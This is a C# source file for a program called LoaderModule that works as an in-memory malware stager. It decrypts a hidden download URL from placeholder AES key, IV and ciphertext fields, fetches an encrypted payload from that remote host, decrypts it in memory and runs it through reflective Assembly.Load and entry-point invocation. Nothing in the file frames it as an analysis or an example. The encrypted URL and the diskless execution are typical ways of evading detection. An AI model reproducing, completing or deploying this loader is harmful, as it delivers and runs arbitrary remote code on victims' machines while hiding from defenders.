using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace LoaderModule
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string aesKey = "%AES_KEY%";
            string iv = "%AES_IV%";
            string url = DecryptStringFromBase64("%ENCRYPTED_STRING%", aesKey, iv);

            try
            {
                byte[] encryptedData = DownloadEncryptedModule(url);
                byte[] decryptedData = DecryptData(encryptedData, aesKey, iv);

                LoadAndRunModule(decryptedData);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Debug-Error: {ex.Message}");
            }
        }

        private static byte[] DownloadEncryptedModule(string url)
        {
            using (WebClient client = new WebClient())
            {
                return client.DownloadData(url);
            }
        }

        private static byte[] DecryptData(byte[] encryptedData, string aesKey, string iv)
        {
            byte[] keyBytes = Convert.FromBase64String(aesKey);
            byte[] ivBytes = Convert.FromBase64String(iv);

            using (AesManaged aes = new AesManaged())
            {
                aes.KeySize = 256;
                aes.Key = keyBytes;
                aes.IV = ivBytes;
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(encryptedData, 0, encryptedData.Length);
                    }
                    return ms.ToArray();
                }
            }
        }
        public static string DecryptStringFromBase64(string encryptedTextBase64, string aesKeyBase64, string ivBase64)
        {
            byte[] encryptedBytes = Convert.FromBase64String(encryptedTextBase64);
            byte[] keyBytes = Convert.FromBase64String(aesKeyBase64);
            byte[] ivBytes = Convert.FromBase64String(ivBase64);

            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.Key = keyBytes;
                aes.IV = ivBytes;
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(encryptedBytes, 0, encryptedBytes.Length);
                        cryptoStream.FlushFinalBlock();
                    }

                    byte[] decryptedBytes = ms.ToArray();
                    return Encoding.UTF8.GetString(decryptedBytes);
                }
            }
        }
        private static void LoadAndRunModule(byte[] moduleData)
        {
            Assembly assembly = Assembly.Load(moduleData);
            MethodInfo entryPoint = assembly.EntryPoint;

            if (entryPoint != null)
            {
                object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[] { } };
                entryPoint.Invoke(null, parameters);
            }
            else
            {
                throw new InvalidOperationException("Entry point not found in the module.");
            }
        }
    }
}
